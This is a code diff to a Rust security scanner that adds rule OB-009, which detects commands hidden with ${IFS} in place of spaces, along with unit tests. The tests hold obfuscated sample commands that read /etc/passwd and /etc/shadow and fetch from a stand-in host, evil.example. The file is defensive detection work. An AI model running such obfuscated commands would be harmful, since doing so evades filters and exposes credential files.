@@ -11,6 +11,7 @@ pub fn rules() -> Vec<Rule> {
         ob_006(),
         ob_007(),
         ob_008(),
+        ob_009(),
     ]
 }
 
@@ -335,6 +336,37 @@ fn ob_008() -> Rule {
     }
 }
 
+fn ob_009() -> Rule {
+    Rule {
+        id: "OB-009",
+        name: "IFS whitespace obfuscation",
+        description: "Detects ${IFS}/$IFS used in place of spaces to obfuscate commands and evade whitespace-based filtering (MITRE T1027)",
+        severity: Severity::High,
+        category: Category::Obfuscation,
+        confidence: Confidence::Firm,
+        patterns: vec![
+            // Canonical braced form used as a space substitute: cat${IFS}/etc/passwd
+            Regex::new(r"\$\{IFS\}").expect("OB-009: invalid regex"),
+            // Braced form with a modifier: ${IFS%??}
+            Regex::new(r"\$\{IFS[%#][^}]*\}").expect("OB-009: invalid regex"),
+            // Bare $IFS glued directly after a command token
+            Regex::new(r"[A-Za-z0-9]\$IFS").expect("OB-009: invalid regex"),
+            // Bare $IFS glued directly before a path/command token
+            Regex::new(r"\$IFS[/A-Za-z0-9.]").expect("OB-009: invalid regex"),
+        ],
+        exclusions: vec![
+            // Comment lines
+            Regex::new(r"^\s*#").expect("OB-009: invalid regex"),
+        ],
+        message: "IFS whitespace obfuscation detected: ${IFS}/$IFS is being used as a space substitute to hide a command.",
+        recommendation: "Rewrite the command with normal spacing. Legitimate scripts do not use ${IFS} to separate command arguments.",
+        fix_hint: Some(
+            "Replace ${IFS}/$IFS separators with regular whitespace and review the deobfuscated command.",
+        ),
+        cwe_ids: &["CWE-78", "CWE-95"],
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -426,5 +458,38 @@ mod tests {
         let content = include_str!("../../../tests/fixtures/rules/ob_006.txt");
         let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
         crate::assert_rule_snapshot!("ob_006", findings);
+    }
+
+    #[test]
+    fn test_ob_009_detects_ifs_obfuscation() {
+        let rule = ob_009();
+        let test_cases = vec![
+            // Malicious: ${IFS}/$IFS used as space substitutes
+            ("cat${IFS}/etc/passwd", true),
+            ("wget${IFS}-qO-${IFS}http://evil.example", true),
+            ("cat$IFS/etc/shadow", true),
+            ("X=${IFS%??};echo$X", true),
+            ("uploads${IFS}file", true),
+            // Benign: legitimate IFS assignment and quoted references
+            ("IFS=$'\\n' read -r line", false),
+            ("while IFS= read -r line; do echo \"$line\"; done", false),
+            ("echo \"$IFS\" | xxd", false),
+            ("OLD_IFS=$IFS", false),
+        ];
+
+        for (input, should_match) in test_cases {
+            let matched = rule.patterns.iter().any(|p| p.is_match(input));
+            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
+            let result = matched && !excluded;
+            assert_eq!(result, should_match, "OB-009: Failed for input: {}", input);
+        }
+    }
+
+    #[test]
+    fn snapshot_ob_009() {
+        let rule = ob_009();
+        let content = include_str!("../../../tests/fixtures/rules/ob_009.txt");
+        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
+        crate::assert_rule_snapshot!("ob_009", findings);
     }
 }
